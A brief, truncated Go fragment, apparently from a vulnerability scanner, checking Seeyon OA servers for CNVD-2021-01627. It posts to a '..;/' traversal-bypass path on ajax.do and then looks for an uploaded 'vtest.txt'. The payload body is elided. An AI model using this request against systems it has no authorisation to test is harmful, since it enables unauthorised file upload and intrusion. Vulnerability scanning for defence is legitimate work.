...
func CNVD_2021_01627(u string, client *httpx.Client) bool {
    ...
    if req, err := client.Request(u+"/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip", "POST", data, nil); err == nil {
        if req.StatusCode == 500 {
            if req2, err := client.Request(u+"/seeyon/vtest.txt", "GET", "", nil); err == nil {
